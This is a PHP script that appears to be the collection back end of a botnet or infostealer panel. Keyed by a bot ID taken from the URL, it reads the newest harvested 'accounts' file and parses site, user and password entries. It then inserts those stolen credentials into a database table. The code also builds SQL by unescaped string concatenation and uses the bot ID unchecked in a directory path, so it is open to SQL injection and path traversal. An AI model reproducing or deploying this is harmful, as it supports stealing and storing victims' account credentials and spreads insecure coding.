<?php
	include "db.php";
	if (isset($_GET["key"])){
		$botId = $_GET["key"];
		$target_dir = $botId."/"."accounts";
		if(!file_exists($target_dir)){
			mkdir($target_dir, 0777, true);
		}
		$files = scandir($target_dir, SCANDIR_SORT_DESCENDING);
		$newest_file = $files[0];
		$re = '/\.\./';
		$has_file = true;
		if(preg_match($re,$newest_file)){
			echo "No File";
			$has_file = false;
		}else{
			$newest_file = $target_dir."/".$newest_file;
			echo $newest_file;
		}
		if($has_file == true){
			$captured=array();
			preg_match('/([0-9]+)_([0-9]+)_([0-9]+)_([0-9]+)_([0-9]+)_([0-9]+)\.txt/',$newest_file,$captured);
			echo "<br>Time: ".$captured[1]."-".$captured[2]."-".$captured[3]." ".$captured[4].":".$captured[5].":".$captured[6]."</br>";
			$file_handle = fopen($newest_file,"r");
			$sites = array();
			$users = array();
			$passwords = array();
			//array_push($sites,"abc");
			//echo "<br>sites[0]: ".$sites[0]."</br>";
			while(!feof($file_handle)){
				$line = fgets($file_handle);
				//$captured="";
				if(preg_match('/^Site:\s(.*)$/',$line,$captured)){
					array_push($sites,$captured[1]);
					//preg_grep('/^Site:\s([.]*)\n/i',$line,PREG_GREP_INVERT);
					//print "<br>"."site|".$captured[1]."|</br>";
				}else if(preg_match('/^User:\s(.*)$/',$line,$captured)){
					array_push($users,$captured[1]);
					//print "<br>"."user|".$captured[1]."|</br>";
				}else if(preg_match('/^Password:\s(.*)$/',$line,$captured)){
					array_push($passwords,$captured[1]);
					//print "<br>"."password|".$captured[1]."|</br>";
				}
				# do same stuff with the $line
			}
			fclose($file_handle);
			$array_length = count($sites,COUNT_NORMAL);
			echo "<br>array length: ".$array_length."</br>";
			$sql = "";
			//$array_length-1
			for($i = 0; $i<3; $i++){
				$sql = $sql."'".$botId."','".$sites[$i]."','".$users[$i]."','".$passwords[$i]."',";
				echo "<br>sql: ".$sql."</br>";
			}
			if($array_length > 0){
				$sql = $sql."'".$botId."','".$sites[$array_length-1]."','".$users[$array_length-1]."','".$passwords[$array_length-1]."'";
			}
			echo "<br>sql: ".$sql."</br>";
			//$sql = "'asdad','url','user','pass'";
			$sql = "INSERT into `password` (`bot_id`,`url`,`user`,`pass`) VALUES (".$sql.")";
			//echo "<br>sql: ".$sql."</br>";
			$result = $conn->query($sql);
			
			if ($result === TRUE) {
				echo "True";
			} else {
				echo "False";
				echo $conn->error;
			}
			/*
			static $num_line = 0;
			while($a = fgets($file_handle)) {
				$num_line++;
			}
			echo -"<br>Numline: ".$num_line."</br>";
			
			for($i = 1; $i <= $num_line/5; $i++){
				echo "<br>"."$i ".$file_handle[$i]."</br>";
			}
			*/
		}
	}
	$conn->close();
?>